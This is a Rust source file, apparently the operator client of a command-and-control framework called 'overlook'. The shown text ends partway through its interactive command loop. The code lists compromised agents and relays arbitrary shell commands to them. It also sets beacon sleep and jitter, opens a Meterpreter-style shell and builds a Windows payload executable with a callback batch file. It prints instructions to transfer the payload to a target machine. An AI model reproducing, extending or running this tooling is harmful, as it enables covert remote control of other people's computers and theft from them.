use clap::{Parser, Subcommand};
use rust_c2::{types::*, crypto::*, protocol::*, utils::*};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;
use uuid::Uuid;
use chrono::Utc;
use anyhow::{Result, anyhow};
use serde_json;

/// Parse command line arguments, handling quoted strings
fn parse_command_args(input: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current_arg = String::new();
    let mut in_quotes = false;
    let mut chars = input.chars().peekable();
    
    // Skip the command name (first word)
    while let Some(&ch) = chars.peek() {
        if ch == ' ' {
            chars.next();
            break;
        }
        chars.next();
    }
    
    while let Some(ch) = chars.next() {
        match ch {
            '"' => {
                in_quotes = !in_quotes;
            }
            ' ' => {
                if !in_quotes {
                    if !current_arg.is_empty() {
                        args.push(current_arg.clone());
                        current_arg.clear();
                    }
                } else {
                    current_arg.push(ch);
                }
            }
            _ => {
                current_arg.push(ch);
            }
        }
    }
    
    if !current_arg.is_empty() {
        args.push(current_arg);
    }
    
    args
}

#[derive(Parser)]
#[command(name = "client")]
#[command(about = "Rust C2 Client - Command and Control Controller")]
struct Cli {
    #[arg(short, long, default_value = "ws://127.0.0.1:8080")]
    server: String,
    
    #[arg(short, long, default_value = "default-key-change-in-production")]
    key: String,
    
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Start the C2 server
    Start,
    /// List all connected agents
    List,
    /// Execute a command on a specific agent
    Execute {
        #[arg(short, long)]
        agent_id: String,
        #[arg(short, long)]
        command: String,
    },
    /// Get system information from an agent
    Sysinfo {
        #[arg(short, long)]
        agent_id: String,
    },
    /// Kill an agent
    Kill {
        #[arg(short, long)]
        agent_id: String,
    },
    /// Set agent sleep duration
    Sleep {
        #[arg(short, long)]
        agent_id: String,
        #[arg(short, long)]
        seconds: u64,
        #[arg(short, long)]
        jitter: f64,
    },
    /// Generate a Windows payload executable
    GeneratePayload {
        #[arg(short, long, default_value = "payload.exe")]
        output: String,
        #[arg(short, long, default_value = "127.0.0.1")]
        callback: String,
        #[arg(short, long, default_value = "8080")]
        port: u16,
        #[arg(short, long, default_value = "default-key-change-in-production")]
        key: String,
    },
    /// Get current working directory from an agent
    Pwd {
        #[arg(short, long)]
        agent_id: String,
    },
    /// Interact with an agent in a Meterpreter-like shell
    Interact {
        #[arg(short, long)]
        agent_id: String,
    },
}

struct C2Client {
    config: ClientConfig,
    encryption_key: EncryptionKey,
    session_manager: Arc<Mutex<SessionManager>>,
    connections: Arc<Mutex<HashMap<AgentId, mpsc::Sender<Message>>>>,
}

impl C2Client {
    fn new(config: ClientConfig) -> Result<Self> {
        let encryption_key = EncryptionKey::new(&config.encryption_key)?;
        let session_manager = Arc::new(Mutex::new(SessionManager::new()));
        let connections = Arc::new(Mutex::new(HashMap::new()));
        
        Ok(Self {
            config,
            encryption_key,
            session_manager,
            connections,
        })
    }
    
    async fn start(&mut self) -> Result<()> {
        let teamserver_url = self.config.teamserver_url.clone();
        println!("Connecting to teamserver at {}", teamserver_url);
        
        // Connect to the teamserver
        let (ws_stream, _) = tokio_tungstenite::connect_async(&teamserver_url).await?;
        let connection = ServerConnection::new(ws_stream, self.encryption_key.clone());
        
        // Handle the connection
        handle_connection_logic(connection, Arc::clone(&self.session_manager), Arc::clone(&self.connections)).await
    }
    
    fn list_agents(&self) {
        // Try to read sessions from file first (if server is running)
        if let Ok(session_data) = std::fs::read_to_string("sessions.json") {
            // Try to parse as full Session objects (what teamserver actually writes)
            if let Ok(sessions) = serde_json::from_str::<Vec<rust_c2::types::Session>>(&session_data) {
                let online_sessions: Vec<_> = sessions.into_iter()
                    .filter(|s| matches!(s.status, rust_c2::types::AgentStatus::Online))
                    .collect();
                println!("[*] Listing connected agents...");
                println!("[*] Total online agents: {}", online_sessions.len());
                if online_sessions.is_empty() {
                    println!("[!] No agents connected");
                    return;
                }
                println!("{}", "=".repeat(100));
                println!("{:<36} {:<20} {:<15} {:<10} {:<12} {:<8} {:<10}",
                    "Agent ID", "Hostname", "IP Address", "Status", "Sleep(ms)", "Jitter", "Note");
                println!("{}", "=".repeat(100));
                for session in online_sessions {
                    println!("{:<36} {:<20} {:<15} {:<10} {:<12} {:<8} {:<10}",
                        session.agent_id, 
                        session.agent_info.hostname, 
                        session.agent_info.ip_address, 
                        "Online", 
                        session.sleep_duration.map_or("-".to_string(), |s| s.to_string()),
                        session.sleep_jitter.map_or("-".to_string(), |j| j.to_string()),
                        "");
                }
                println!("{}", "=".repeat(100));
                return;
            }
            
            // Try new format with sleep info first (fallback)
            if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String, Option<u64>, Option<u8>)>>(&session_data) {
                let online_sessions: Vec<_> = sessions.into_iter()
                    .filter(|(_, _, _, status, _, _)| status == "Online")
                    .collect();
                
                println!("[*] Listing connected agents...");
                println!("[*] Total online agents: {}", online_sessions.len());
                
                if online_sessions.is_empty() {
                    println!("[!] No agents connected");
                    return;
                }
                
                println!("{}", "=".repeat(100));
                println!("{:<36} {:<20} {:<15} {:<10} {:<12} {:<8} {:<10}",
                    "Agent ID", "Hostname", "IP Address", "Status", "Sleep(ms)", "Jitter", "Note");
                println!("{}", "=".repeat(100));
                for (agent_id, hostname, ip, status, sleep, jitter) in online_sessions {
                    println!("{:<36} {:<20} {:<15} {:<10} {:<12} {:<8} {:<10}",
                        agent_id, hostname, ip, status, 
                        sleep.map_or("-".to_string(), |s| s.to_string()),
                        jitter.map_or("-".to_string(), |j| j.to_string()),
                        "");
                }
                println!("{}", "=".repeat(100));
                return;
            }
            
            // Fallback to old format
            if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String)>>(&session_data) {
                let online_sessions: Vec<_> = sessions.into_iter()
                    .filter(|(_, _, _, status)| status == "Online")
                    .collect();
                
                println!("[*] Listing connected agents...");
                println!("[*] Total online agents: {}", online_sessions.len());
                
                if online_sessions.is_empty() {
                    println!("[!] No agents connected");
                    return;
                }
                
                println!("{}", "=".repeat(100));
                println!("{:<36} {:<20} {:<15} {:<10} {:<15}", "ID", "Hostname", "IP", "Status", "Sleep");
                println!("{}", "-".repeat(100));
                
                for (agent_id, hostname, ip, status) in online_sessions {
                    println!(
                        "{:<36} {:<20} {:<15} {:<10} {:<15}",
                        agent_id, hostname, ip, status, "Default"
                    );
                }
                println!("{}", "=".repeat(100));
                return;
            }
        }
        
        // Fallback to local session manager
        if let Ok(sm) = self.session_manager.lock() {
        let sessions = sm.get_all_sessions();
        let online_sessions: Vec<_> = sessions.into_iter()
            .filter(|(_, s)| matches!(s.status, rust_c2::types::AgentStatus::Online))
            .collect();
        
        println!("[*] Listing connected agents...");
        println!("[*] Total online agents: {}", online_sessions.len());
        
        if online_sessions.is_empty() {
            println!("[!] No agents connected");
            return;
        }
        
        println!("{}", "=".repeat(100));
        println!("{:<36} {:<20} {:<15} {:<10} {:<15}", "ID", "Hostname", "IP", "Status", "Sleep");
        println!("{}", "-".repeat(100));
        
        for (agent_id, session) in online_sessions {
            let sleep_info = if let Some(duration) = session.sleep_duration {
                let seconds = duration / 1000;
                if let Some(jitter) = session.sleep_jitter {
                    format!("{}s ±{}%", seconds, jitter)
                } else {
                    format!("{}s", seconds)
                }
            } else {
                "Default".to_string()
            };
            
            println!(
                "{:<36} {:<20} {:<15} {:<10} {:<15}",
                agent_id,
                session.agent_info.hostname,
                session.agent_info.ip_address,
                "Online",
                sleep_info
            );
        }
        println!("{}", "=".repeat(100));
        } else {
            println!("[!] Failed to acquire session manager lock");
        }
    }
    
    async fn execute_command(&self, agent_id_str: &str, command: &str) -> Result<()> {
        use rust_c2::types::{Message, CommandType};
        use uuid::Uuid;
        let agent_id: Uuid = agent_id_str.parse()
            .map_err(|_| anyhow!("Invalid agent ID"))?;
        let command_id = Uuid::new_v4();
        let command_type = CommandType::ShellCommand(command.to_string());
        // New: Wrap the command in a new variant for relaying via the teamserver
        let msg = Message::Command {
            command_id,
            command: command_type.clone(),
        };
        if let Ok(mut connections) = self.connections.lock() {
            // Try direct connection first (legacy)
            if let Some(tx) = connections.get_mut(&agent_id) {
                tx.send(msg.clone()).await?;
                println!("[*] Sent command to agent {} via direct connection", agent_id);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
                Ok(())
            } else if let Some(tx) = connections.get_mut(&Uuid::nil()) {
                // Relay via teamserver connection
                // New: Send a special relay message with agent_id
                let relay_msg = Message::RelayCommand {
                    agent_id,
                    command_id,
                    command: command_type,
                };
                tx.send(relay_msg).await?;
                println!("[*] Sent command to agent {} via teamserver relay", agent_id);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
                Ok(())
            } else {
                Err(anyhow!("No connection found for agent {} or teamserver", agent_id))
            }
        } else {
            Err(anyhow!("Not connected to teamserver. Please reconnect."))
        }
    }

    async fn generate_payload(&self, output: &str, callback: &str, port: u16, key: &str) -> Result<()> {
        use std::process::Command;
        use std::fs;
        use std::path::Path;

        println!("🔧 Generating Windows payload...");
        println!("📡 Callback: {}:{}", callback, port);
        println!("🔑 Encryption key: {}", key);
        println!("📁 Output: {}", output);

        // Check if we have the Windows target installed
        let target_check = Command::new("rustup")
            .args(&["target", "list", "--installed"])
            .output()?;

        let targets = String::from_utf8_lossy(&target_check.stdout);
        let windows_target = if targets.contains("x86_64-pc-windows-msvc") {
            "x86_64-pc-windows-msvc"
        } else if targets.contains("x86_64-pc-windows-gnu") {
            "x86_64-pc-windows-gnu"
        } else {
            println!("⚠️  Windows target not found. Installing x86_64-pc-windows-msvc...");
            Command::new("rustup")
                .args(&["target", "add", "x86_64-pc-windows-msvc"])
                .status()?;
            "x86_64-pc-windows-msvc"
        };

        println!("🔨 Building agent for target: {}", windows_target);

        // Build the agent for Windows
        let build_status = Command::new("cargo")
            .args(&[
                "build",
                "--release",
                "--bin",
                "agent",
                "--target",
                windows_target,
            ])
            .status()?;

        if !build_status.success() {
            return Err(anyhow!("Failed to build agent. Check your Rust toolchain."));
        }

        // Determine the source path based on target
        let source_path = format!("target/{}/release/agent.exe", windows_target);
        
        if !Path::new(&source_path).exists() {
            return Err(anyhow!("Built executable not found at: {}", source_path));
        }

        // Copy the agent executable to the output path
        fs::copy(&source_path, output)?;
        
        // Make the output file executable (on Unix systems)
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(output)?.permissions();
            perms.set_mode(0o755);
            fs::set_permissions(output, perms)?;
        }

        // Create a batch file that runs the agent with the correct parameters
        let batch_content = format!(
            r#"@echo off
echo Starting C2 Agent...
echo Callback: {}:{}
echo.

REM Run the agent with the specified parameters
"%~dp0{}" --server "ws://{}:{}" --key "{}" --heartbeat 30

echo.
echo Agent finished.
pause
"#,
            callback, port, 
            Path::new(output).file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("agent.exe"), 
            callback, port, key
        );

        // Write the batch file
        let batch_path = output.replace(".exe", ".bat");
        fs::write(&batch_path, batch_content)?;
        println!("📝 Created batch file: {}", batch_path);

        println!("✅ Payload generated successfully!");
        println!("📦 Executable: {}", output);
        println!("📦 Batch file: {}", batch_path);
        println!("📏 Size: {} bytes", fs::metadata(output)?.len());
        println!("");
        println!("🚀 To deploy:");
        println!("   1. Transfer both files to your target Windows machine");
        println!("   2. Run: {}", batch_path);
        println!("   3. The agent will connect back to {}:{}", callback, port);
        println!("");
        println!("💡 Tip: Use 'list' command to see when the agent connects!");

        Ok(())
    }

    fn write_sessions_to_file(&self) {
        if let Ok(sm) = self.session_manager.lock() {
        let sessions = sm.get_all_sessions();
        
        let session_data: Vec<(String, String, String, String, Option<u64>, Option<u8>)> = sessions
            .iter()
            .map(|(agent_id, session)| (
                agent_id.to_string(),
                session.agent_info.hostname.clone(),
                session.agent_info.ip_address.clone(),
                format!("{:?}", session.status),
                session.sleep_duration,
                session.sleep_jitter
            ))
            .collect();
        
        if let Ok(json) = serde_json::to_string(&session_data) {
            let _ = std::fs::write("sessions.json", json);
            }
        } else {
            eprintln!("Failed to acquire session manager lock for writing sessions");
        }
    }

    fn cleanup_stale_sessions(&self) {
        // Get live connections
        let live_connections = if let Ok(connections) = self.connections.lock() {
            connections.keys().cloned().collect::<std::collections::HashSet<_>>()
        } else {
            std::collections::HashSet::new()
        };

        // Read and update sessions.json
        if let Ok(session_data) = std::fs::read_to_string("sessions.json") {
            if let Ok(mut sessions) = serde_json::from_str::<Vec<rust_c2::types::Session>>(&session_data) {
                let mut updated = false;
                
                for session in &mut sessions {
                    if matches!(session.status, rust_c2::types::AgentStatus::Online) && !live_connections.contains(&session.agent_id) {
                        session.status = rust_c2::types::AgentStatus::Offline;
                        updated = true;
                        println!("[*] Marked agent {} as offline (no live connection)", session.agent_id);
                    }
                }
                
                if updated {
                    if let Ok(updated_data) = serde_json::to_string_pretty(&sessions) {
                        if let Err(e) = std::fs::write("sessions.json", updated_data) {
                            eprintln!("[!] Failed to write updated sessions: {}", e);
                        } else {
                            println!("[*] Updated sessions.json with offline agents");
                        }
                    }
                }
            }
        }
        
        println!("[*] Cleanup completed");
    }

    async fn execute_sysinfo(&self, agent_id: &str) -> Result<()> {
        let agent_id: Uuid = agent_id.parse()
            .map_err(|_| anyhow!("Invalid agent ID"))?;
        
        let command_id = Uuid::new_v4();
        let command_type = CommandType::GetSystemInfo;
        
        // Check if we have a teamserver connection (client mode)
        if let Ok(connections) = self.connections.lock() {
            if let Some(tx) = connections.get(&Uuid::nil()) {
                // We're connected to teamserver, relay the command
                let relay_msg = Message::RelayCommand {
                    agent_id,
                    command_id,
                    command: command_type,
                };
                if let Err(e) = tx.try_send(relay_msg) {
                    return Err(anyhow!("Failed to send sysinfo command to teamserver: {}", e));
                }
                println!("[*] Tasked agent {} to execute command: GetSystemInfo", agent_id);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
                return Ok(());
            }
        }
        
        // Fallback: check local session file (for standalone mode)
        let mut agent_found = false;
        if let Ok(session_data) = std::fs::read_to_string("sessions.json") {
            // Try new format with sleep info first
            if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String, Option<u64>, Option<u8>)>>(&session_data) {
                for (session_agent_id, _, _, _, _, _) in sessions {
                    if session_agent_id == agent_id.to_string() {
                        agent_found = true;
                        break;
                    }
                }
            } else if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String)>>(&session_data) {
                // Fallback to old format
                for (session_agent_id, _, _, _) in sessions {
                    if session_agent_id == agent_id.to_string() {
                        agent_found = true;
                        break;
                    }
                }
            }
        }
        
        if !agent_found {
            return Err(anyhow!("Agent {} not found in active sessions. Make sure the server is running and the agent is connected.", agent_id));
        }
        
        // Get the connection for this agent (direct connection mode)
        if let Ok(connections) = self.connections.lock() {
            if let Some(tx) = connections.get(&agent_id) {
                let message = Message::Command {
                    command_id,
                    command: command_type,
                };
                
                // Send the command to the agent
                if let Err(e) = tx.try_send(message) {
                    return Err(anyhow!("Failed to send command to agent: {}", e));
                }
                
                println!("[*] Tasked agent {} to execute command: GetSystemInfo", agent_id);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
            } else {
                // If no connection is available, this means we're in standalone mode
                // and the server isn't running. We need to start it temporarily.
                println!("⚠️  No active connection found for agent {}.", agent_id);
                println!("💡 This usually means you're running a standalone command.");
                println!("💡 To execute commands, you need to:");
                println!("   1. Start the server in interactive mode: cargo run --bin c2-server");
                println!("   2. Wait for the agent to connect");
                println!("   3. Use the 'sysinfo' command from the interactive prompt");
                println!("");
                println!("💡 Alternatively, you can start the server in the background:");
                println!("   cargo run --bin c2-server start");
                println!("   Then run your command in another terminal.");
                
                return Err(anyhow!("Agent {} is registered but connection channel is not available. Try using interactive mode or start the server first.", agent_id));
            }
        } else {
            return Err(anyhow!("Failed to acquire connections lock"));
        }
        
        Ok(())
    }







    async fn execute_kill(&self, agent_id: &str) -> Result<()> {
        let agent_id: Uuid = agent_id.parse()
            .map_err(|_| anyhow!("Invalid agent ID"))?;
        
        let command_id = Uuid::new_v4();
        let command_type = CommandType::Kill;
        
        // Check if we have a teamserver connection (client mode)
        if let Ok(connections) = self.connections.lock() {
            if let Some(tx) = connections.get(&Uuid::nil()) {
                // We're connected to teamserver, relay the command
                let relay_msg = Message::RelayCommand {
                    agent_id,
                    command_id,
                    command: command_type,
                };
                if let Err(e) = tx.try_send(relay_msg) {
                    return Err(anyhow!("Failed to send kill command to teamserver: {}", e));
                }
                println!("[*] Tasked agent {} to terminate itself", agent_id);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
                return Ok(());
            }
        }
        
        // Fallback: check local session file (for standalone mode)
        let mut agent_found = false;
        if let Ok(session_data) = std::fs::read_to_string("sessions.json") {
            // Try new format with sleep info first
            if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String, Option<u64>, Option<u8>)>>(&session_data) {
                for (session_agent_id, _, _, _, _, _) in sessions {
                    if session_agent_id == agent_id.to_string() {
                        agent_found = true;
                        break;
                    }
                }
            } else if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String)>>(&session_data) {
                // Fallback to old format
                for (session_agent_id, _, _, _) in sessions {
                    if session_agent_id == agent_id.to_string() {
                        agent_found = true;
                        break;
                    }
                }
            }
        }
        
        if !agent_found {
            return Err(anyhow!("Agent {} not found in active sessions. Make sure the server is running and the agent is connected.", agent_id));
        }
        
        // Get the connection for this agent (direct connection mode)
        if let Ok(connections) = self.connections.lock() {
            if let Some(tx) = connections.get(&agent_id) {
                let message = Message::Command {
                    command_id,
                    command: command_type,
                };
                
                // Send the command to the agent
                if let Err(e) = tx.try_send(message) {
                    return Err(anyhow!("Failed to send kill command to agent: {}", e));
                }
                
                // Mark the session as offline
                {
                    if let Ok(mut sm) = self.session_manager.lock() {
                        if let Some(session) = sm.get_session_mut(&agent_id) {
                            session.status = AgentStatus::Offline;
                        }
                    } else {
                        eprintln!("Failed to acquire session manager lock for kill command");
                    }
                }
                self.write_sessions_to_file();
                
                println!("[*] Tasked agent {} to terminate itself", agent_id);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
            } else {
                // If no connection is available, this means we're in standalone mode
                // and the server isn't running. We need to start it temporarily.
                println!("⚠️  No active connection found for agent {}.", agent_id);
                println!("💡 This means you're running a standalone command from a separate terminal.");
                println!("💡 The connection channels are only available in the process running the WebSocket server.");
                println!("💡 To execute commands, you need to:");
                println!("   1. Start the server in interactive mode: .\\target\\release\\c2-server.exe");
                println!("   2. Wait for the agent to connect");
                println!("   3. Use the 'kill' command from the interactive prompt");
                println!("");
                println!("💡 Example:");
                println!("   overlook> kill {}", agent_id);
                
                return Err(anyhow!("Agent {} is registered but connection channel is not available. Use interactive mode to execute commands.", agent_id));
            }
        } else {
            return Err(anyhow!("Failed to acquire connections lock"));
        }
        
        Ok(())
    }

    async fn execute_sleep(&self, agent_id: &str, sleep_seconds: u64, jitter_percent: f64) -> Result<()> {
        let agent_id: Uuid = agent_id.parse()
            .map_err(|_| anyhow!("Invalid agent ID"))?;
        
        let command_id = Uuid::new_v4();
        let jitter_percent = (jitter_percent * 100.0) as u8; // Convert to percentage
        let command_type = CommandType::Sleep { 
            duration: sleep_seconds * 1000, // Convert to milliseconds
            jitter_percent 
        };
        
        // Check if we have a teamserver connection (client mode)
        if let Ok(connections) = self.connections.lock() {
            if let Some(tx) = connections.get(&Uuid::nil()) {
                // We're connected to teamserver, relay the command
                let relay_msg = Message::RelayCommand {
                    agent_id,
                    command_id,
                    command: command_type,
                };
                if let Err(e) = tx.try_send(relay_msg) {
                    return Err(anyhow!("Failed to send sleep command to teamserver: {}", e));
                }
                println!("[*] Tasked agent {} to set sleep duration: {} seconds ± {}%", agent_id, sleep_seconds, jitter_percent);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
                return Ok(());
            }
        }
        
        // Fallback: check local session file (for standalone mode)
        let mut agent_found = false;
        if let Ok(session_data) = std::fs::read_to_string("sessions.json") {
            // Try new format with sleep info first
            if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String, Option<u64>, Option<u8>)>>(&session_data) {
                for (session_agent_id, _, _, _, _, _) in sessions {
                    if session_agent_id == agent_id.to_string() {
                        agent_found = true;
                        break;
                    }
                }
            } else if let Ok(sessions) = serde_json::from_str::<Vec<(String, String, String, String)>>(&session_data) {
                // Fallback to old format
                for (session_agent_id, _, _, _) in sessions {
                    if session_agent_id == agent_id.to_string() {
                        agent_found = true;
                        break;
                    }
                }
            }
        }
        
        if !agent_found {
            return Err(anyhow!("Agent {} not found in active sessions. Make sure the server is running and the agent is connected.", agent_id));
        }
        
        // Get the connection for this agent (direct connection mode)
        if let Ok(connections) = self.connections.lock() {
            if let Some(tx) = connections.get(&agent_id) {
                let message = Message::Command {
                    command_id,
                    command: command_type,
                };
                
                // Send the command to the agent
                if let Err(e) = tx.try_send(message) {
                    return Err(anyhow!("Failed to send command to agent: {}", e));
                }
                
                println!("[*] Tasked agent {} to set sleep duration: {} seconds ± {}%", agent_id, sleep_seconds, jitter_percent);
                println!("[*] Command ID: {}", command_id);
                println!("[*] Waiting for response...");
            } else {
                // If no connection is available, this means we're in standalone mode
                // and the server isn't running. We need to start it temporarily.
                println!("⚠️  No active connection found for agent {}.", agent_id);
                println!("💡 This usually means you're running a standalone command.");
                println!("💡 To execute commands, you need to:");
                println!("   1. Start the server in interactive mode: cargo run --bin c2-server");
                println!("   2. Wait for the agent to connect");
                println!("   3. Use the 'sleep' command from the interactive prompt");
                println!("");
                println!("💡 Alternatively, you can start the server in the background:");
                println!("   cargo run --bin c2-server start");
                println!("   Then run your command in another terminal.");
                
                return Err(anyhow!("Agent {} is registered but connection channel is not available. Try using interactive mode or start the server first.", agent_id));
            }
        } else {
            return Err(anyhow!("Failed to acquire connections lock"));
        }
        
        Ok(())
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    
    // Initialize logging
    log_info("client", "Starting C2 client");
    
    if let Some(Commands::Interact { agent_id }) = &cli.command {
        // Connect to the teamserver
        let key = cli.key.clone();
        let server = cli.server.clone();
        let encryption_key = EncryptionKey::new(&key)?;
        let (ws_stream, _) = tokio_tungstenite::connect_async(&server).await?;
        let mut connection = ServerConnection::new(ws_stream, encryption_key);
        println!("[*] Interacting with agent {}. Type 'exit' to quit.", agent_id);
        use std::io::{self, Write};
        loop {
            print!("meterpreter({})> ", agent_id);
            io::stdout().flush()?;
            let mut input = String::new();
            io::stdin().read_line(&mut input)?;
            let input = input.trim();
            if input == "exit" {
                break;
            }
            // Send command to agent
            let command_id = Uuid::new_v4();
            let msg = Message::Command {
                command_id,
                command: CommandType::ShellCommand(input.to_string()),
            };
            connection.send_message(&msg).await?;
            // Wait for response
            if let Some(Message::Response { command_id: resp_id, ref response }) = connection.receive_message().await? {
                if resp_id == command_id {
                    match response {
                        CommandResponse::Success { output, exit_code: _ } => println!("{}", output),
                        CommandResponse::Error { error, exit_code: _ } => println!("[!] Error: {}", error),
                        CommandResponse::SystemInfo(sysinfo) => {
                            println!("\n[*] Tasked agent to get system information");
                            println!("[*] Agent {} returned system info:", agent_id);
                            println!("{}", "=".repeat(60));
                            println!("Hostname: {}", sysinfo.hostname);
                            println!("Username: {}", sysinfo.username);
                            println!("OS: {}", sysinfo.os);
                            println!("Architecture: {}", sysinfo.architecture);
                            println!("Uptime: {} seconds", sysinfo.uptime);
                            println!("Memory: {} / {} MB", sysinfo.memory_used, sysinfo.memory_total);
                            println!("CPU Count: {}", sysinfo.cpu_count);
                            println!("IP Addresses: {}", sysinfo.ip_addresses.join(", "));
                            println!("MAC Addresses: {}", sysinfo.mac_addresses.join(", "));
                            println!("{}", "=".repeat(60));
                        }
                        CommandResponse::ProcessList(processes) => {
                            println!("\n[*] Tasked agent to get process list");
                            println!("[*] Agent {} returned {} processes:", agent_id, processes.len());
                            println!("{}", "=".repeat(80));
                            println!("{:<8} {:<20} {:<30} {:<10} {:<10}", "PID", "Name", "Command", "Memory(MB)", "CPU(%)");
                            println!("{}", "-".repeat(80));
                            for process in processes.iter().take(20) { // Limit to first 20 processes
                                println!("{:<8} {:<20} {:<30} {:<10} {:<10.1}", 
                                    process.pid,
                                    if process.name.len() > 19 { &process.name[..19] } else { &process.name },
                                    if process.command.len() > 29 { &process.command[..29] } else { &process.command },
                                    process.memory_usage / 1024 / 1024,
                                    process.cpu_usage
                                );
                            }
                            if processes.len() > 20 {
                                println!("... and {} more processes", processes.len() - 20);
                            }
                            println!("{}", "=".repeat(80));
                        }
                    }
                }
            }
        }
        return Ok(());
    }
    
    let config = ClientConfig {
        teamserver_url: cli.server,
        encryption_key: cli.key,
        timeout: 30,
        retry_interval: 5,
        max_retries: 3,
    };
    
    let mut client = C2Client::new(config)?;
    
    match &cli.command {
        Some(Commands::Start) => {
            client.start().await?;
        }
        Some(Commands::List) => {
            // Send ListAgentsRequest; response will be printed asynchronously
            use rust_c2::types::Message;
            use uuid::Uuid;
            if let Ok(conns) = client.connections.lock() {
                if let Some(sender) = conns.get(&Uuid::nil()) {
                    let _ = sender.clone().try_send(Message::ListAgentsRequest);
                    println!("[*] Requested agent list from teamserver. Waiting for response...");
                } else {
                    println!("[!] Not connected to teamserver");
                }
            } else {
                println!("[!] Not connected to teamserver");
            }
        }
        Some(Commands::Execute { agent_id, command }) => {
            client.execute_command(&agent_id, &command).await?;
        }
        Some(Commands::Sysinfo { agent_id }) => {
            client.execute_sysinfo(&agent_id).await?;
        }
        Some(Commands::Kill { agent_id }) => {
            client.execute_kill(&agent_id).await?;
        }
        Some(Commands::Sleep { agent_id, seconds, jitter }) => {
            client.execute_sleep(&agent_id, *seconds, *jitter).await?;
        }
        Some(Commands::GeneratePayload { output, callback, port, key }) => {
            client.generate_payload(&output, &callback, *port, &key).await?;
        }
        Some(Commands::Pwd { agent_id: _ }) => {
            println!("Pwd command not implemented");
        }
        None => {
            // Interactive mode
            println!("

        _    .  ,   .           .
    *  / \_ *  / \_      _  *        *   /\'__        *
      /    \  /    \,   ((        .    _/  /  \  *'.
 .   /\/\  /\/ :' __ \_  `          _^/  ^/    `--.
    /    \/  \  _/  \-'\      *    /.' ^_   \_   .'\  *
  /\  .-   `. \/     \ /==~=-=~=-=-;.  _/ \ -. `_/   \
 /  `-.__ ^   / .-'.--\ =-=~_=-=~=^/  _ `--./ .-'  `-
/jgs     `.  / /       `.~-^=-=~=^=.-'      '-._ `._

  ___                 _             _    
 / _ \__   _____ _ __| | ___   ___ | | __
| | | \ \ / / _ \ '__| |/ _ \ / _ \| |/ /
| |_| |\ V /  __/ |  | | (_) | (_) |   < 
 \___/  \_/ \___|_|  |_|\___/ \___/|_|\_\

");
            println!("overlook - Command and Control Framework");
            println!("Starting WebSocket client...");
            
            // Clean up any stale sessions on startup
            client.cleanup_stale_sessions();
            
            // Start the WebSocket client
            let client_config = client.config.clone();
            let session_manager = Arc::clone(&client.session_manager);
            let encryption_key = client.encryption_key.clone();
            let connections = Arc::clone(&client.connections);
            
            // Spawn the client
            tokio::spawn(async move {
                let teamserver_url = client_config.teamserver_url.clone();
                println!("🌐 WebSocket client connecting to {}", teamserver_url);
                
                // Connect to the teamserver
                match tokio_tungstenite::connect_async(&teamserver_url).await {
                    Ok((ws_stream, _)) => {
                let connection = ServerConnection::new(ws_stream, encryption_key);
                
                // Handle the connection
                if let Err(e) = handle_connection_logic(connection, session_manager, connections).await {
                    eprintln!("Connection error: {}", e);
                        }
                    }
                    Err(e) => {
                        eprintln!("Failed to connect to teamserver: {}", e);
                    }
                }
            });
            
            // Give the client a moment to connect
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            println!("Type 'help' for available commands");
            
            loop {
                print!("overlook> ");
                use std::io::{self, Write};
                io::stdout().flush()?;
                
                let mut input = String::new();
                io::stdin().read_line(&mut input)?;
                let input = input.trim();
                
                match input {
                    "help" => {
                        println!("Available commands:");
                        println!("  list                    - List all agents");
                        println!("  execute <id> <cmd>      - Execute command on agent (use quotes for commands with spaces)");
                        println!("  sysinfo <id>           - Get system info from agent");
                        println!("  sleep <id> <seconds> <jitter>   - Set agent sleep duration with jitter (%)");
                        println!("  kill <id>              - Kill agent");
                        println!("  generatepayload <output> <callback> <port> <key> - Generate Windows payload");
                        println!("  cleanup                 - Remove stale/offline sessions");
                        println!("  quit                   - Exit");
                        println!("");
                        println!("Note: Use quotes around arguments that contain spaces:");
                        println!("  execute 123e4567-e89b-12d3-a456-426614174000 \"copy file1.txt file2.txt\"");
                    }
                    "list" => {
                        // Send ListAgentsRequest; response will be printed asynchronously
                        use rust_c2::types::Message;
                        use uuid::Uuid;
                        if let Ok(conns) = client.connections.lock() {
                            if let Some(sender) = conns.get(&Uuid::nil()) {
                                let _ = sender.clone().try_send(Message::ListAgentsRequest);
                                println!("[*] Requested agent list from teamserver. Waiting for response...");
                            } else {
                                println!("[!] Not connected to teamserver");
                            }
                        } else {
                            println!("[!] Not connected to teamserver");
                        }
                    }
                    "quit" | "exit" => {
                        break;
                    }
                    _ => {
                        if input.starts_with("execute ") {
                            let args = parse_command_args(input);
                            if args.len() == 2 {
                                if let Err(e) = client.execute_command(&args[0], &args[1]).await {
                                    eprintln!("Error: {}", e);
                                }
                            } else {
                                println!("Usage: execute <agent_id> <command>");
                                println!("Example: execute 123e4567-e89b-12d3-a456-426614174000 \"copy file1.txt file2.txt\"");
                            }
                        } else if input.starts_with("sysinfo ") {
                            let parts: Vec<&str> = input.splitn(2, ' ').collect();
                            if parts.len() == 2 {
                                let agent_id = parts[1];
                                if let Err(e) = client.execute_sysinfo(agent_id).await {
                                    eprintln!("Error: {}", e);
                                }
                            } else {
                                println!("Usage: sysinfo <agent_id>");
                            }
                        } else if input.starts_with("sleep ") {
